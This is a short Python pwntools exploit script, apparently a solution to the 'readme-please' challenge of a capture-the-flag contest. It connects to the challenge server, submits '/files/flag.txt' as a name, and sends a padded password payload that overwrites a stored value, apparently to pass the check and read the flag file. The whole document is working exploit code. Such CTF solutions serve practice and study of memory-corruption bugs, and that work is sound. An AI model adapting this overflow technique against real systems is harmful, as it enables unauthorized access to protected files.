#!/usr/bin/env python3

from pwn import *

exe = ELF("./main", checksec=False)
context.binary = exe

if args.LOCAL:
    p = process([exe.path])
else:
	p = remote("readme-please.ctf.pearlctf.in", 30039)

input()

p.sendafter(b'name: ', b'/files/flag.txt')
payload = p64(50) + b'a'*(112 - 8) + p64(50)
p.sendlineafter(b'password: ', payload)

# p.sendlineafter(b'name: ', b'/files/flag.txt')
# payload = p64(50) + b'a'*(112 - 8) + p64(50)
# p.sendlineafter(b'password: ', payload)

p.interactive()